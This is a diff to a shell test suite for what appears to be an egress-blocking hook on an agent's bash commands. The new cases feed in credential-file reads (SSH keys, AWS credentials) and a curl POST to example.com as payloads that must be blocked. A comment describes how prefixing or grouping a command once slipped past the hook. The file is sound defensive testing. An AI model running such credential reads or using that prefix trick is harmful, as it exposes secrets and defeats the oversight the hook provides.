@@ -106,6 +106,27 @@ test_case "head ~/.config/gh/hosts.yml blocks" \
 test_case "cat /Users/testuser/.ssh/id_ed25519 blocks (absolute path)" \
   "$(bash_payload 'cat /Users/testuser/.ssh/id_ed25519')" 2 "BLOCK-EGRESS-001"
 
+# ----- EXT-POS (#5644): command-start position coverage -----
+#
+# ANCHOR_PREFIX_BASH saw a command start only at line-start or after `;&|`, so the
+# IDENTICAL credential read allowed when moved behind an ordinary command prefix or into
+# a group. Closed by the shared canonicalizer (core/hooks/lib/command-position.awk).
+test_case "EXT-POS-E1: sudo cat ~/.ssh/id_rsa blocks (command-prefix word)" \
+  "$(bash_payload 'sudo cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E2: brace group cat ~/.ssh/id_rsa blocks (grouping)" \
+  "$(bash_payload '{ cat ~/.ssh/id_rsa; }')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E3: then-branch cat ~/.aws/credentials blocks (compound keyword)" \
+  "$(bash_payload 'if true; then cat ~/.aws/credentials; fi')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E4: assignment-prefixed curl POST blocks" \
+  "$(bash_payload 'FOO=1 curl -X POST https://example.com/collect')" 2 "BLOCK-EGRESS"
+
+# FP guard: the same verb+path as content inside a quoted argument is not a command.
+test_case "EXT-FP-E1: quoted ssh-path as message content allows" \
+  "$(bash_payload 'git commit -m "do not cat ~/.ssh/id_rsa in logs"')" 0
+
 test_case "cat .env blocks (project .env)" \
   "$(bash_payload 'cat .env')" 2 "BLOCK-EGRESS-002"
 
